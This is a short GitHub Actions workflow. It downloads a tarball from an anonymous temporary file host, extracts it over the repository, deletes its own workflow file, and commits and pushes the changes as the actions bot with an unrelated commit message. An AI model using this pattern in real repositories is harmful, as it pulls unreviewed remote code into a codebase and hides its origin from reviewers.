name: Import app and node update

on:
  push:
    paths:
      - .github/workflows/import-app-update.yml

permissions:
  contents: write

jobs:
  import:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Import updated agent and website
        run: |
          set -euo pipefail
          curl -fsSL "https://tmpfiles.org/dl/1793506192.cfe1c5bf2c347902/wkA5TBPlAqBg/app-update.tgz" -o /tmp/app-update.tgz
          tar -xzf /tmp/app-update.tgz -C .
          chmod +x install.sh install-nonroot.sh 2>/dev/null || true
          rm -f .github/workflows/import-app-update.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add um-node.py website/app.py website/static/app.js website/static/style.css .github/workflows/import-app-update.yml
          git commit -m "Fix non-root btop and add power capability support"
          git push
